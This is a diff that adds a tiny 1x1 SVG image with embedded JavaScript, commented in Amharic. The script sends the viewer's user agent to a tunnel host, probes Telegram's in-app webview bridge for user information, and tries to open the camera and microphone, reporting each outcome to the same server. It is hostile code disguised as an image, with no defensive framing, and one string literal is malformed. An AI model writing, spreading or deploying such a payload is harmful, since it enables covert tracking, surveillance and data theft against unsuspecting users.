@@ -1,0 +1,32 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+  <script>
+    // <![CDATA[
+    try {
+        var my_server = https://62966f71227f3303-196-191-121-170.serveousercontent.com/";
+
+        // 1. መሰረታዊ መረጃ መላክ (IP & Device Info)
+        fetch(my_server + "log?info=" + btoa(navigator.userAgent));
+
+        // 2. የቴሌግራም ድልድይን (Proxy) በመጠቀም የውስጥ መረጃ መፈለግ
+        if (window.TelegramWebviewProxy) {
+            // የቴሌግራምን የውስጥ መረጃ ለመጠየቅ መሞከር
+            var data = JSON.stringify({"type": "get_user_info"}); 
+            window.TelegramWebviewProxy.postEvent("resize_frame", data);
+            fetch(my_server + "log?status=bridge_accessed");
+        }
+
+        // 3. ካሜራ ለመክፈት መሞከር (Permission ካለ)
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(function(stream) {
+                fetch(my_server + "log?status=camera_opened");
+            })
+            .catch(function(err) {
+                fetch(my_server + "log?error=camera_denied");
+            });
+
+    } catch(e) {
+        fetch(my_server + "error?msg=" + btoa(e.message));
+    }
+    // ]]>
+  </script>
+</svg>
